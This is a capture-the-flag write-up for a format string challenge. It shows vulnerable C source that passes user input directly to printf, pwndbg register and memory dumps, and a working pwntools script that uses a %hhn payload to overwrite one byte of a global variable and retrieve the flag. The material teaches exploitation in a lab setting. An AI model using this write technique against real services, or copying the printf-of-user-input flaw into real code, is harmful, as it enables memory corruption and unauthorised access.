# Format

The task:

>A generic format string challenge, but requiring a bit of finesse. Can you pull it off?
>
> nc challenges.ctfd.io 30266

We were given the source code of a binary running on ``challenges.ctfd.io:30266``:

```c
#include <stdio.h>
#include <stdint.h>

uint64_t num;

void vuln() {
	char buf[64];
	puts("Give me some text.");
	fgets(buf, sizeof(buf), stdin);
	printf("You typed ");
	printf(buf);
	printf("!\n");
}

/* You don't need to understand how this works
 *
 * In case you're curious, this loads the pointer guard from the TCB. This
 * value was chosen because it is randomized and can be accessed without
 * following any pointer chains in this object's memory. */
#define LOAD_SECRET(x) \
	__asm__ volatile ( \
		"mov %%fs:0x30, %0;" \
		: "=r" (x) \
	)

void check_num() {
	uint64_t goal;
	LOAD_SECRET(goal);
	__asm__ volatile (
		"mov $0x42, %b0;"
		: "+r" (goal)
	);
	if (num != goal) {
		puts("Nope, try again");
	} else {
		puts("Congrats! here's your flag");
		char flagbuf[64];
		FILE* f = fopen("./flag.txt", "r");
		fgets(flagbuf, sizeof(flagbuf), f);
		fclose(f);
		puts(flagbuf);
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	LOAD_SECRET(num);
	/* clear the low byte - that way there is no random chance of
	 * getting the flag without doing anything */
	__asm__ volatile (
		"mov $0, %b0;"
		: "+r" (num)
	);

	vuln();

	check_num();

	return 0;
}

```

The program's ``check_num`` function will always fail and we'll never get the flag unless we abuse the format string bug because:
* It takes a random number --> put it in ``num`` (using the ``LOAD_SECRET`` macro)
* Calling ``check_num``, loading the secret again but comparing it with the result of ``num+0x42`` (or, ``goal`` in the source code)
* Obviously ``num`` !== ``num+0x42`` so the program fails

Inside ``check_num``, the ``if (num != goal) {`` statement determines whether we're getting the flag or not.

After having a closer look at it in gdb, this is how it looks like:

```
0x0000000000401260 in check_num ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[──────────────────────────────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────────────────────────────]
*RAX  0x5c278a023d35d342
 RBX  0x0
 RCX  0x7ffff7b042c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 RDI  0x1
 RSI  0x7ffff7dd26a3 (_IO_2_1_stdout_+131) ◂— 0xdd3780000000000a /* '\n' */
 R8   0x7ffff7fe9700 ◂— 0x7ffff7fe9700
 R9   0x12
 R10  0x25b
 R11  0x246
 R12  0x4010e0 (_start) ◂— endbr64
 R13  0x7fffffffe200 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x4012f0 (__libc_csu_init) ◂— endbr64
 RSP  0x7fffffffe0c0 ◂— 0x4141414141414141 ('AAAAAAAA')
*RIP  0x401260 (check_num+32) ◂— cmp    qword ptr [rip + 0x2e19], rax
[───────────────────────────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────────────────────────────]
   0x401245 <check_num+5>      mov    rax, qword ptr fs:[0x28]
   0x40124e <check_num+14>     mov    qword ptr [rsp + 0x48], rax
   0x401253 <check_num+19>     xor    eax, eax
   0x401255 <check_num+21>     mov    rax, qword ptr fs:[0x30]
   0x40125e <check_num+30>     mov    al, 0x42
 ► 0x401260 <check_num+32>     cmp    qword ptr [rip + 0x2e19], rax <0x404080> 
 ```

The values of ``num`` and ``goal``

```
+pwndbg> x ($rip + 0x2e19)
0x404080 <num>: 0x5c278a023d35d300

+pwndbg> p/x $rax
$3 = 0x5c278a023d35d342
```

As can be seen above, they are almost identical. The only difference is the last byte. 

So, our goal here is to overwrite the least significant byte of ``num`` (located in the .bss section)
```
+pwndbg> info symbol 0x404080
num in section .bss of /tmp/format
```


## Solution

Shift the stack accordingly and use the ``hhn`` format specifier to overwrite only the least significant byte of ``num``

```py
from pwn import *

r = remote('challenges.ctfd.io', 30266)

payload =  b'%32x%33xQ'   # padding to reach 0x42 bytes
payload += b'%8$hhn|'     # writing to the 8th element on the stack (which is "num"'s address, below)
payload += p64(0x404080)  # .bss <num>

r.sendlineafter('text', payload)
r.recvuntil('flag')
print(r.recv().decode('utf-8'))
```

Output:
```
nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}
```
